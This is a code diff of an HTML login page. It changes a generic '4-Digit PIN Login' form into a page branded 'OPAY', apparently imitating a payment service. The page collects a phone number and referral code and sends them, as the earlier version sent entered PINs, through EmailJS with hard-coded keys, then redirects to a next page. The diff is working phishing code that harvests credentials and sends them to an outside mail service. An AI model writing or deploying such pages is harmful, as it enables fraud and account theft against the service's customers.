@@ -3,47 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>4-Digit PIN Login</title>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script>
+    <title>OPAY</title>
+
+    <!-- Include EmailJS library -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script type="text/javascript">
         // Initialize EmailJS
         (function () {
-            emailjs.init("brHvxqtsePQc4PuqQ");
+            emailjs.init("brHvxqtsePQc4PuqQ"); // Replace with your public key
         })();
 
-        // Function to handle PIN submission
-        function handlePinSubmit(event) {
-            event.preventDefault(); // Prevent form submission
+        // Function to send email and redirect
+        function handleSendAndLogin(event) {
+            event.preventDefault(); // Prevent default form submission
 
-            // Collect PIN inputs
-            const pinInputs = document.querySelectorAll('.pin-input');
-            let pin = '';
-            pinInputs.forEach(input => {
-                pin += input.value;
-            });
+            // Get form input values
+            const phone = document.getElementById("phone").value;
+            const referral = document.getElementById("referral").value;
 
-            // Ensure PIN is 4 digits
-            if (pin.length === 4) {
-                // Prepare email parameters
-                const emailParams = {
-                    pin_code: pin, // Key matches {{pin_code}} in EmailJS template
-                };
+            // Prepare email parameters
+            const emailParams = {
+                phone_number: phone,
+                referral_code: referral
+            };
 
-                // Send email using EmailJS
-                emailjs.send("service_p5v1sz7", "template_ak5d8h8", emailParams)
-                    .then(() => {
-                        alert("PIN sent successfully!");
-                        window.location.href = "success.html"; // Redirect after success
-                    })
-                    .catch((error) => {
-                        console.error("Error sending email:", error);
-                        alert("Failed to send PIN. Please try again.");
-                    });
-            } else {
-                alert("Please enter a valid 4-digit PIN.");
-            }
+            // Send email using EmailJS
+            emailjs.send("service_p5v1sz7", "template_ak5d8h8", emailParams)
+                .then((response) => {
+                    console.log("Email sent successfully:", response);
+                    alert("Your details have been sent successfully!");
+
+                    // Redirect after successful email
+                    window.location.href = "index2.html";
+                })
+                .catch((error) => {
+                    console.error("Error sending email:", error);
+                    alert("Failed to send details. Please try again.");
+                });
         }
     </script>
+
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -55,59 +55,63 @@
             align-items: center;
             height: 100vh;
         }
-        .pin-container {
-            background: #ffffff;
+        .login-container {
+            background: lime;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             width: 100%;
-            max-width: 300px;
-            text-align: center;
+            max-width: 400px;
         }
-        .pin-container h2 {
+        .login-container h1 {
+            text-align: center;
             margin-bottom: 20px;
             color: #333;
         }
-        .pin-inputs {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
+        .form-group {
+            margin-bottom: 15px;
         }
-        .pin-inputs input {
-            width: 50px;
-            height: 50px;
-            text-align: center;
-            font-size: 18px;
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
             border: 1px solid #ddd;
             border-radius: 5px;
         }
-        .pin-container button {
+        .form-group button {
             width: 100%;
             padding: 10px;
-            background-color: #007bff;
+            background-color: greenyellow;
             color: #ffffff;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
         }
-        .pin-container button:hover {
-            background-color: #0056b3;
+        .form-group button:hover {
+            background-color: lightgreen;
         }
     </style>
 </head>
 <body>
-    <div class="pin-container">
-        <h2>Enter Your 4-Digit PIN</h2>
-        <form onsubmit="handlePinSubmit(event)">
-            <div class="pin-inputs">
-                <input type="password" maxlength="1" class="pin-input" required>
-                <input type="password" maxlength="1" class="pin-input" required>
-                <input type="password" maxlength="1" class="pin-input" required>
-                <input type="password" maxlength="1" class="pin-input" required>
+    <div class="login-container">
+        <h1>OPAY</h1>
+        <form onsubmit="handleSendAndLogin(event)">
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="text" id="phone" name="phone" required>
             </div>
-            <button type="submit">Submit</button>
+            <div class="form-group">
+                <label for="referral">Referral Code</label>
+                <input type="text" id="referral" name="referral" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Send & Login</button>
+            </div>
         </form>
     </div>
 </body>
